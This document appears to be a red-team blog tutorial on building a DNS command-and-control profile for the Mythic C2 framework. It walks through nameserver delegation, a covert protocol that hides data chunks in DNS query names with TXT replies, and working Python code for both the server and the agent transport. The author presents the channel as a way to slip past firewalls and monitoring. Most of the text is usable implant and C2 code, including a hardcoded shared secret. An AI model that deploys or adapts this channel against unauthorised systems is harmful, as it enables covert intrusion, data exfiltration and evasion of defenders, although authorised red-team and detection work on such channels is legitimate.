This post covers the full process of building a custom DNS command and control profile from scratch and integrating it into the Mythic C2 framework. This includes the DNS infrastructure setup, the Mythic C2 profile container, the protocol design, the agent-side transport, and the builder integration.

Why DNS C2

Most network monitoring focuses on HTTP/HTTPS traffic. DNS is different, it’s treated as essential infrastructure and is almost never blocked outright. Firewalls that would catch an HTTP callback to an unknown IP will happily pass a DNS query to an external nameserver. This makes DNS an ideal covert channel in restrictive environments.

The tradeoff is bandwidth. DNS labels are limited to 63 characters each, and a full FQDN can’t exceed 253 characters. You’re not going to exfiltrate large files over DNS, but for task dispatch, small command output, and maintaining a beacon, it works very well.

How It Works

The fundamental idea is to abuse the DNS query/response cycle as a bidirectional communication channel:

  • The agent encodes data into DNS query names : for example, s.a9f4.0003.0014.aGVsbG8=.d4e8f2a1.infra.domain.name
  • Your VM is the authoritative nameserver for infra.domain.name, so all queries for that zone land on your machine directly
  • A Python DNS server on your VM decodes the query, processes it, and returns data in the TXT record of the response
  • The agent reads the TXT response and reassembles it

No HTTP. No TCP connections to suspicious IPs. From the network’s perspective, it’s just DNS traffic.

DNS Infrastructure

Disabling systemd-resolved Stub Listener

By default, Ubuntu’s systemd-resolved binds to port 53 on localhost. This would conflict with our DNS server. We need to free up the port while keeping DNS resolution working.

Edit the resolved config:

sudo nano /etc/systemd/resolved.conf

Add or uncomment:

DNSStubListener=no

Restart:

sudo systemctl restart systemd-resolved

Verify the port is now free:

sudo ss -tlnp | grep 53

DNS resolution still works because systemd-resolved continues to function via its socket at /run/systemd/resolve/stub-resolv.conf, it just no longer binds port 53.

Opening Port 53 in Azure NSG

Since the Mythic VM is on Azure, port 53 needs an inbound NSG rule for both TCP and UDP:

Both are needed, DNS uses UDP by default but falls back to TCP for large responses.

DNS Delegation in Cloudflare

This is the key piece. We need to make our VM the authoritative nameserver for a subdomain of our domain. Everything under infra.domain.name needs to resolve by asking our VM, not Cloudflare.

Add these two records in Cloudflare:

Type Name Value Proxy
A ns1 <Mythic VM IP> ⚫ DNS only
NS infra ns1.domain.name ⚫ DNS only

The NS record says: “for anything under infra.domain.name, ask ns1.domain.name”. The A record resolves ns1.domain.name to our VM. Both must be DNS only, no Cloudflare proxy.

Verify the delegation from an external machine:

dig NS infra.domain.name
dig TXT test.infra.domain.name

The NS query should return ns1.domain.name. The TXT query will time out or return SERVFAIL. Expected, since nothing is listening yet.

Protocol Design

Before writing any code, we designed the protocol. The constraints are:

  • DNS labels: max 63 characters each
  • Full FQDN: max 253 characters
  • Data encoding: base64url (safe for DNS labels)
  • Our domain infra.domain.name takes 18 characters plus dots

This leaves roughly 40 characters of usable data per chunk, we settled on 40 chars as our chunk size.

Packet Structure

Every DNS query from the agent follows this format:

<type>.<channel_id>.<seq>.<total>.<data>.<hmac>.infra.domain.name
Field Size Description
type 1 char Message type: r, s, p, e
channel_id 4 chars Hex channel ID assigned by server on registration
seq 4 chars Hex sequence number of this chunk
total 4 chars Hex total number of chunks
data ≤40 chars Base64url encoded chunk (padding stripped)
hmac 8 chars First 8 hex chars of HMAC-MD5 over channel+seq+data

Message Types

Type Direction Purpose
r Agent –> Server Register : get a channel ID assigned
s Agent –> Server Send : transmit a data chunk
p Agent –> Server Poll : request next outbound chunk
e Agent –> Server End : signal done receiving

Example Query

A real registration query looks like:

r.amao.2g8c.infra.domain.name: type TXT, class IN

A real send chunk looks like:

s.c7ff.0004.0014.MWRCWEVLencxNVdiL2xNdjR0RTZPbmNFQy9PZU5D.50106060.infra.domain.name: type TXT, class IN

Breaking that down:

  • s = send type
  • c7ff = channel ID
  • 0004 = sequence 4 (hex)
  • 0014 = total 20 chunks (hex)
  • MWRCWEV... = 40 chars of base64url data
  • 6644e1b9 = HMAC integrity check

Server Responses

The server responds with TXT records. Response values:

Value Meaning
<4-char hex> Registration response: your new channel ID
<4-char hex> Send response: next expected sequence number
DONE All chunks received, Mythic response is ready
ERR HMAC verification failed
<chunk>.<hmac> Poll response: data chunk with integrity check
END Poll response: no more chunks
IDLE Poll response: nothing ready yet
ACK End acknowledgement

HMAC Integrity

Every chunk is signed with HMAC-MD5 using a shared secret (weedns_secret in our implementation). The agent computes:

hmac_md5("weedns_secret", f"{channel_id}{seq}{chunk_clean}").hexdigest()[:8]

The server verifies the same. This prevents query spoofing and ensures chunk integrity. In a production engagement you would rotate this secret per payload.

Full Cycle Data Flow

1. Agent: r.xxxx.xxxx.infra.domain.name
   Server: "a9f4"  (channel ID assigned)
 
2. Agent: s.a9f4.0000.0014.<chunk0>.<hmac>.infra.domain.name
   Server: "0001"  (next expected seq)
 
   Agent: s.a9f4.0001.0014.<chunk1>.<hmac>.infra.domain.name
   Server: "0002"
 
   ... (20 chunks total) ...
 
   Agent: s.a9f4.0013.0014.<chunk19>.<hmac>.infra.domain.name
   Server: "DONE"  (all received, Mythic response ready)
 
3. Agent: p.a9f4.0000.infra.domain.name
   Server: "<chunk0>.<hmac>"
 
   Agent: p.a9f4.0001.infra.domain.name
   Server: "<chunk1>.<hmac>"
 
   ... (14 response chunks) ...
 
   Agent: p.a9f4.000d.infra.domain.name
   Server: "END"

The DNS C2 Profile Container

Mythic’s C2 profiles run as Docker containers. Each profile consists of two parts:

  • A Mythic-side definition that registers the profile, its parameters, and how to start the server
  • A server script that handles the actual protocol

We built ours in Python, mirroring the structure of the existing weeagent container.

The DNS Server

This is the core of the profile. It handles all incoming DNS queries, manages channel state, assembles inbound messages, forwards them to Mythic, and chunks outbound responses for DNS delivery.

The full file is long, here are the key components:

Helpers

HMAC_SECRET = b"weedns_secret"
 
def verify_hmac(data: str, sig: str) -> bool:
    expected = hmac.new(HMAC_SECRET, data.encode(), hashlib.md5).hexdigest()[:8]
    return hmac.compare_digest(expected, sig)
 
def make_hmac(data: str) -> str:
    return hmac.new(HMAC_SECRET, data.encode(), hashlib.md5).hexdigest()[:8]
 
def b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)
 
def b64url_encode(b: bytes) -> str:
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "_").replace("=", "")

Mythic Bridge

This is how the server forwards assembled agent messages to Mythic’s internal API. The mythic: dns header is mandatory, without it Mythic rejects the request with a 400 and logs Failed to get 'mythic' header.

MYTHIC_URL = "http://127.0.0.1:17443"
 
async def forward_to_mythic(data: bytes) -> bytes:
    async with aiohttp.ClientSession() as session:
        async with session.post(
            f"{MYTHIC_URL}/agent_message",
            data=data,
            headers={
                "Content-Type": "application/octet-stream",
                "mythic": "dns"
            },
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            return await resp.read()

Inbound Assembly

The server stores chunks in a dict keyed by channel ID. Once all chunks arrive it assembles and decodes them:

def assemble_inbound(channel_id: str) -> bytes | None:
    ch = channels.get(channel_id)
    total = ch.get("inbound_total", 0)
    chunks = ch["inbound"]
    if len(chunks) < total:
        return None
    assembled = ""
    for i in range(total):
        assembled += chunks[i]
    assembled += "=" * (-len(assembled) % 4)
    return b64url_decode(assembled)

Outbound Chunking

The raw Mythic HTTP response bytes are base64url encoded and split into 40-char chunks for DNS delivery:

def prepare_outbound(channel_id: str, data: bytes):
    encoded = b64url_encode(data)
    chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
    channels[channel_id]["outbound"] = chunks
    channels[channel_id]["state"] = "send"

DNS Resolver

The resolver handles all four message types. The send handler (s) is the most complex, it receives chunks, verifies HMAC, assembles the message when complete, forwards to Mythic, and signals DONE to the agent:

elif msg_type == "s":
    seq   = int(parts[2], 16)
    total = int(parts[3], 16)
    data  = parts[4]
    sig   = parts[5]
 
    if not verify_hmac(f"{channel_id}{seq}{data}", sig):
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ERR")))
        return reply
 
    channels[channel_id]["inbound"][seq] = data
    channels[channel_id]["inbound_total"] = total
 
    received = set(channels[channel_id]["inbound"].keys())
    next_seq = 0
    while next_seq in received:
        next_seq += 1
 
    if next_seq >= total:
        assembled = assemble_inbound(channel_id)
        mythic_response = sync_forward_to_mythic(assembled)
        prepare_outbound(channel_id, mythic_response)
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("DONE")))
    else:
        reply.add_answer(RR(qname, QTYPE.TXT,
            rdata=TXT(format(next_seq, "04x"))))

The poll handler (p) serves chunks sequentially:

elif msg_type == "p":
    seq = int(parts[2], 16)
    ch = channels.get(channel_id)
 
    if not ch or ch["state"] != "send" or not ch["outbound"]:
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("IDLE")))
        return reply
 
    chunks = ch["outbound"]
    if seq >= len(chunks):
        channels[channel_id]["state"] = "idle"
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("END")))
    else:
        chunk = chunks[seq]
        sig = make_hmac(f"{channel_id}{seq}{chunk}")
        reply.add_answer(RR(qname, QTYPE.TXT,
            rdata=TXT(f"{chunk}.{sig}")))

Agent-Side Transport

The transport layer lives in the agent and is responsible for encoding data into DNS queries and decoding responses. It follows the exact same template structure as the existing HTTP transport in weeagent, so the builder can inject it transparently.

Raw DNS Implementation

We implemented DNS queries from scratch using Python’s socket and struct modules, no external dependencies. This keeps the agent portable and avoids needing dnspython on the target.

def _dns_txt_query(self, fqdn):
    dns_server = self.agent_config["DNSServer"]
    tx_id = random.randint(0, 65535)
    flags = 0x0100
    header = struct.pack(">HHHHHH", tx_id, flags, 1, 0, 0, 0)
 
    labels = b""
    for part in fqdn.split("."):
        encoded = part.encode()
        labels += struct.pack("B", len(encoded)) + encoded
    labels += b"\x00"
 
    question = labels + struct.pack(">HH", 16, 1)  # TXT, IN
    packet = header + question
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    sock.sendto(packet, (dns_server, 53))
    response, _ = sock.recvfrom(4096)
    sock.close()
 
    return self._parse_dns_txt_response(response, tx_id)

The response parser manually walks the DNS wire format to extract TXT strings:

def _parse_dns_txt_response(self, data, expected_tx_id):
    tx_id = struct.unpack(">H", data[0:2])[0]
    if tx_id != expected_tx_id:
        return ""
    ancount = struct.unpack(">H", data[6:8])[0]
    if ancount == 0:
        return ""
 
    offset = 12
    # skip question section
    while data[offset] != 0:
        offset += data[offset] + 1
    offset += 5  # null byte + qtype + qclass
 
    # parse answer TXT records
    result = ""
    for _ in range(ancount):
        if (data[offset] & 0xC0) == 0xC0:
            offset += 2
        else:
            while data[offset] != 0:
                offset += data[offset] + 1
            offset += 1
        rtype, _, _, rdlength = struct.unpack(">HHIH", data[offset:offset+10])
        offset += 10
        if rtype == 16:
            end = offset + rdlength
            pos = offset
            while pos < end:
                txt_len = data[pos]; pos += 1
                result += data[pos:pos+txt_len].decode(errors="replace")
                pos += txt_len
        offset += rdlength
    return result

Registration

On first use, the agent registers with the server to get a channel ID:

def _register(self):
    fqdn = "r.{}.{}.{}".format(
        self._random_str(4),
        self._random_str(4),
        self.agent_config["C2Domain"]
    )
    response = self._dns_txt_query(fqdn)
    if response and len(response) == 4:
        self.agent_config["_channel_id"] = response
        return True
    return False

Sending Data

Data is base64url encoded and split into 40-char chunks. Each chunk’s HMAC is computed on the cleaned chunk (padding stripped) since = signs aren’t valid in DNS labels:

def _send_chunks(self, encoded_data):
    chunks = [encoded_data[i:i+40] for i in range(0, len(encoded_data), 40)]
    total = len(chunks)
    channel = self.agent_config.get("_channel_id", "0000")
 
    for seq, chunk in enumerate(chunks):
        chunk_clean = chunk.rstrip("=")
        sig = self._make_hmac(f"{channel}{seq}{chunk_clean}")
        fqdn = "s.{}.{:04x}.{:04x}.{}.{}.{}".format(
            channel, seq, total, chunk_clean, sig,
            self.agent_config["C2Domain"]
        )
        response = self._dns_txt_query(fqdn)
        if not response:
            return ""
 
    return response

Polling for Responses

After sending, the agent polls sequentially for response chunks. Each chunk is HMAC verified before being added to the assembled buffer:

def _poll_chunks(self):
    channel = self.agent_config.get("_channel_id", "0000")
    assembled = ""
    seq = 0
 
    while True:
        fqdn = "p.{}.{:04x}.{}".format(channel, seq, self.agent_config["C2Domain"])
        response = self._dns_txt_query(fqdn)
 
        if not response or response == "IDLE":
            return b""
        if response == "END":
            break
 
        parts = response.split(".")
        if len(parts) < 2:
            break
        chunk, sig = parts[0], parts[1]
 
        if self._make_hmac(f"{channel}{seq}{chunk}") != sig:
            break
 
        assembled += chunk
        seq += 1
 
    try:
        return self._b64url_decode(assembled)
    except Exception:
        return b""

postMessageAndRetrieveResponse

This is the main interface that the agent core calls. It wraps the full send -> poll -> decrypt -> parse cycle:

def postMessageAndRetrieveResponse(self, data):
    if not self.agent_config.get("_channel_id"):
        if not self._register():
            return {}
 
    formatted = self.formatMessage(data)
    encoded = self._b64url_encode(formatted) if isinstance(formatted, bytes) else formatted
 
    result = self._send_chunks(encoded)
    if not result or result in ("ERR", ""):
        return {}
 
    if result == "DONE":
        raw = self._poll_chunks()
        if not raw:
            return {}
        try:
            decrypted = self.decrypt(raw)
            if not decrypted:
                return {}
            return self.formatResponse(decrypted)
        except Exception:
            return {}
    return {}

Note that decrypt is called on the raw reassembled bytes before formatResponse. The Mythic response format is uuid(36 bytes) + iv(16) + ciphertext + hmac(32), all binary. The decrypt function in crypto_lib.py3 handles the AES-256-CBC decryption and HMAC verification.
